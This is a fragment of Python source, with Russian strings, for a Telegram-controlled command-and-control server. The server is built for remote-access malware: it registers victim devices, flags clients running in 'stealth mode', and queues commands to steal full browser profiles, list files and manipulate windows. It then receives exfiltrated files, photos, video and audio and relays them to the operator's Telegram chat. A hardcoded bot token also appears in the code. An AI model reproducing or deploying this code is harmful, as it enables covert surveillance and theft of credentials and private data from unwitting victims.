                [InlineKeyboardButton("Mozilla Firefox (полный профиль)", callback_data=f"action_{device_id}_browser_full:firefox")],
                [InlineKeyboardButton("🔙 Назад", callback_data=f"action_{device_id}_files_menu")]
            ]
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="Выберите браузер для скачивания полного профиля:",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        
        elif action.startswith("browser_full:"):
            browser = action.split(":")[1]
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                        (device_id, f"browser_full:{browser}"))
            
            await self.application.bot.send_message(
                chat_id=chat_id,
                text=f"Запрос полного профиля {browser} отправлен. Это может занять несколько минут...",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔄 Обновить", callback_data=f"device_{device_id}")]
                ])
            )
        elif action.startswith("ls:"):
            path = action.split(":", 1)[1]
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                        (device_id, f"ls:{path}"))
            await self.application.bot.send_message(
                chat_id=chat_id,
                text=f"Запрос содержимого {path} отправлен устройству. Ожидайте...",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔙 Назад", callback_data=f"action_{device_id}_files_menu")]
                ]))
        elif action.startswith("browser:"):
            browser = action.split(":", 1)[1]
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                        (device_id, f"browser:{browser}"))
            await self.application.bot.send_message(
                chat_id=chat_id,
                text=f"Запрос данных браузера {browser} отправлен устройству. Ожидайте...",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔙 Назад", callback_data=f"action_{device_id}_browsers_menu")]
                ]))

    def run(self):
        self.application.run_polling()

@api.post("/upload_file")
async def upload_file(request: Request):
    data = await request.json()
    file_data = data['file_data']
    file_name = data.get('file_name', 'file.bin')
    
    # Генерируем уникальное имя файла
    import uuid
    unique_id = str(uuid.uuid4())
    save_name = f"{unique_id}_{file_name}"
    save_path = os.path.join(UPLOAD_FOLDER, save_name)
    
    with open(save_path, 'wb') as f:
        f.write(base64.b64decode(file_data))
    
    return {
        "status": "success",
        "download_url": f"http://{request.client.host}:{API_PORT}/downloads/{save_name}"
    }

@api.post("/upload_chunk")
async def upload_chunk(request: Request):
    data = await request.json()
    file_name = data['file_name']
    chunk_num = data['chunk_num']
    
    # Сохраняем чанк во временную папку
    temp_dir = os.path.join(UPLOAD_FOLDER, "temp")
    os.makedirs(temp_dir, exist_ok=True)
    
    chunk_path = os.path.join(temp_dir, f"{file_name}.part{chunk_num}")
    with open(chunk_path, 'wb') as f:
        f.write(base64.b64decode(data['file_data']))
    
    # Сохраняем информацию о чанке
    upload_progress[file_name][chunk_num] = chunk_path
    
    return {"status": "success"}

@api.post("/finalize_upload")
async def finalize_upload(request: Request):
    data = await request.json()
    file_name = data['file_name']
    total_chunks = data['total_chunks']
    
    # Проверяем, все ли чанки получены
    if len(upload_progress.get(file_name, {})) != total_chunks:
        return {"status": "error", "message": "Not all chunks received"}
    
    # Собираем файл из чанков
    unique_id = str(uuid.uuid4())
    final_name = f"{unique_id}_{file_name}"
    final_path = os.path.join(UPLOAD_FOLDER, final_name)
    
    with open(final_path, 'wb') as outfile:
        for i in range(total_chunks):
            chunk_path = upload_progress[file_name][i]
            with open(chunk_path, 'rb') as infile:
                outfile.write(infile.read())
            os.remove(chunk_path)
    
    del upload_progress[file_name]
    
    return {
        "status": "success",
        "download_url": f"http://{request.client.host}:{API_PORT}/downloads/{final_name}"
    }

@api.post("/register")
async def register_device(request: Request):
    data = await request.json()
    device_id = data['device_id']
    is_new = False
    with sqlite3.connect(DATABASE) as conn:
        c = conn.cursor()
        c.execute('SELECT COUNT(*) FROM devices WHERE device_id=?', (device_id,))
        if c.fetchone()[0] == 0:
            is_new = True
        conn.execute('''INSERT OR REPLACE INTO devices 
                      (device_id, name, ip, os, last_seen, is_online)
                      VALUES (?, ?, ?, ?, datetime('now'), 1)''',
                   (device_id, data['system_info']['name'],
                    data['system_info']['ip'], data['system_info']['os']))
    if is_new and bot_instance:
        try:
            stealth_note = "\n⚠️ Клиент работает в скрытом режиме" if data.get("stealth") else ""
            await bot_instance.application.bot.send_message(
                chat_id=ADMIN_IDS[0],
                text=f"🆕 Новое устройство зарегистрировано:\nID: {device_id}\nИмя: {data['system_info']['name']}\nIP: {data['system_info']['ip']}\nOS: {data['system_info']['os']}{stealth_note}"
            )
        except Exception as e:
            logger.error(f"Ошибка отправки уведомления о новом устройстве: {e}")
    return {"status": "success"}

@api.post("/heartbeat")
async def heartbeat(request: Request):
    data = await request.json()
    
    with sqlite3.connect(DATABASE) as conn:
        conn.execute("UPDATE devices SET last_seen=datetime('now'), is_online=1 WHERE device_id=?",
                   (data['device_id'],))
    
    return {"status": "success"}

@api.get("/commands")
async def get_commands(device_id: str):
    with sqlite3.connect(DATABASE) as conn:
        c = conn.cursor()
        c.execute("SELECT id, command FROM commands WHERE device_id=? AND status='pending'",
                 (device_id,))
        commands = [{"id": row[0], "command": row[1]} for row in c.fetchall()]
        
        if commands:
            c.execute("UPDATE commands SET status='executing' WHERE id IN ({})".format(
                ",".join(str(cmd['id']) for cmd in commands)))
    
    return {"commands": commands}

@api.post("/command_result")
async def command_result(request: Request):
    data = await request.json()
    device_id = data['device_id']
    command_id = data['command_id']
    result = data.get('result', '')
    file_type = data.get('file_type')
    file_data = data.get('file_data')
    
    if file_type == 'video' and 'Видео' in result:
        temp_dir = os.path.join(tempfile.gettempdir(), f"video_multi_{device_id}")
        os.makedirs(temp_dir, exist_ok=True)
        idx = len(os.listdir(temp_dir)) + 1
        video_path = os.path.join(temp_dir, f"part{idx}.avi")
        with open(video_path, 'wb') as f:
            f.write(base64.b64decode(file_data))
        if f"{idx}/" in result:
            pass
        else:
            files = sorted([os.path.join(temp_dir, f) for f in os.listdir(temp_dir) if f.endswith('.avi')])
            if len(files) > 1:
                out_path = os.path.join(temp_dir, 'merged.avi')
                try:
                    frames = []
                    for f in files:
                        cap = cv2.VideoCapture(f)
                        while True:
                            ret, frame = cap.read()
                            if not ret:
                                break
                            frames.append(frame)
                        cap.release()
                    if frames:
                        h, w, _ = frames[0].shape
                        out = cv2.VideoWriter(out_path, cv2.VideoWriter_fourcc(*'MJPG'), 5.0, (w, h))
                        for frame in frames:
                            out.write(frame)
                        out.release()
                        with open(out_path, 'rb') as f:
                            merged_bytes = f.read()
                        await bot_instance.application.bot.send_video(
                            chat_id=ADMIN_IDS[0],
                            video=merged_bytes,
                            caption=f"Склеенное видео с устройства {device_id}"
                        )
                        shutil.rmtree(temp_dir)
                except Exception as e:
                    logger.error(f"Ошибка склейки видео: {e}")
    elif result and result.count(':') > 5 and all(':' in line for line in result.splitlines()):
        lines = result.splitlines()
        keyboard = []
        for line in lines:
            try:
                hwnd, title = line.split(':', 1)
                hwnd = hwnd.strip()
                title = title.strip()
                row = [
                    InlineKeyboardButton(f"🗔 {title}", callback_data=f"noop") ,
                    InlineKeyboardButton("🔽", callback_data=f"action_{device_id}_window_action_{hwnd}_minimize"),
                    InlineKeyboardButton("��", callback_data=f"action_{device_id}_window_action_{hwnd}_restore"),
                    InlineKeyboardButton("❌", callback_data=f"action_{device_id}_window_action_{hwnd}_close")
                ]
                keyboard.append(row)
            except:
                continue
        keyboard.append([InlineKeyboardButton("🔙 Назад", callback_data=f"device_{device_id}")])
        await bot_instance.application.bot.send_message(
            chat_id=ADMIN_IDS[0],
            text="Список окон:",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    elif data.get('file_type') == 'url':
        keyboard = [
            [InlineKeyboardButton("⬇️ Скачать файл", url=data['result'])]
        ]
        
        await bot_instance.application.bot.send_message(
            chat_id=ADMIN_IDS[0],
            text=f"✅ Файл готов к скачиванию\n\n"
                 f"📁 Имя файла: {os.path.basename(data['result'])}\n"
                 f"🔗 Ссылка действительна 24 часа",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    elif file_type == 'file':
        file_bytes = base64.b64decode(file_data)
        await bot_instance.application.bot.send_document(
            chat_id=ADMIN_IDS[0],
            document=file_bytes,
            filename=f"download_{device_id}.zip" if 'браузера' in result else os.path.basename(result.split()[-1]),
            caption=f"Результат с устройства {device_id}\n\n{result}"
        )
    else:
        if bot_instance:
            try:
                if file_type and file_data:
                    file_bytes = base64.b64decode(file_data)
                    if file_type == 'photo':
                        await bot_instance.application.bot.send_photo(
                            chat_id=ADMIN_IDS[0],
                            photo=file_bytes,
                            caption=f"Результат с устройства {device_id}\n\n{result}"
                        )
                    elif file_type == 'video':
                        await bot_instance.application.bot.send_video(
                            chat_id=ADMIN_IDS[0],
                            video=file_bytes,
                            caption=f"Результат с устройства {device_id}\n\n{result}"
                        )
                    elif file_type == 'audio':
                        await bot_instance.application.bot.send_audio(
                            chat_id=ADMIN_IDS[0],
                            audio=file_bytes,
                            caption=f"Результат с устройства {device_id}\n\n{result}"
                        )
                else:
                    await bot_instance.application.bot.send_message(
                        chat_id=ADMIN_IDS[0],
                        text=f"Результат выполнения команды:\n\n{result}"
                    )
            except Exception as e:
                logger.error(f"Ошибка отправки результата: {e}")
    
    with sqlite3.connect(DATABASE) as conn:
        conn.execute("UPDATE commands SET status='completed' WHERE id=?",
                   (command_id,))
    
    return {"status": "success"}

def run_api_server():
    if is_port_in_use(API_PORT):
        logger.error(f"Порт {API_PORT} уже занят!")
        return
    
    config = uvicorn.Config(
        api,
        host="0.0.0.0",
        port=API_PORT,
        log_level="info"
    )
    server = uvicorn.Server(config)
    server.run()

def main():
    try:
        external_ip = requests.get('https://api.ipify.org').text
        print(f"Ваш внешний IP: {external_ip}")
    except:
        print("Не удалось определить внешний IP")
    
    if is_port_in_use(API_PORT):
        print(f"Ошибка: Порт {API_PORT} уже используется!")
        return
    
    api_thread = Thread(target=run_api_server, daemon=True)
    api_thread.start()
    
    try:
        bot = ServerBot("8060699147:AAEawF_dYzDuEA7lqF_FHCuHsujuMwF4r8k")
        global bot_instance
        bot_instance = bot
        print(f"\nСервер запущен:")
        print(f"Локальный адрес: http://localhost:{API_PORT}")
        print(f"Внешний адрес: http://{external_ip}:{API_PORT}")
        bot.run()
    except Exception as e:
        print(f"Ошибка при запуске бота: {e}")

if __name__ == '__main__':
    main()